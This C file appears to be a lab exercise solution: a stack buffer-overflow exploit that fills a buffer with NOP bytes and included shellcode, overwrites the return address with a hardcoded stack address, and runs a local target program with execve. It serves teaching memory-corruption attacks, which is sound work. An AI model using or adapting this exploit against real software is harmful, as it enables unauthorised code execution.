#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

# define BUFFLEN 125

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	char buff[BUFFLEN];
	int i;
	for (i = 0; i < BUFFLEN; i++){
		buff[i] = 0x90;
	}

	for (i = 0; i < strlen(shellcode); i++){
		buff[i] = shellcode[i];
	}
	// buffer address 0x2021fe50, rip at 0x2021fe38, 0x18 to decimal is 24, 24 + 96 = 120
	int* loc = (int*)&buff[BUFFLEN - 5];
	*loc = 0x2021fe50; 

	int* end = (int*)&buff[BUFFLEN - 1];
	*end = '\0'; 

	args[0] = TARGET;
	//args[1] = "hi there";
	args[1] = buff;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
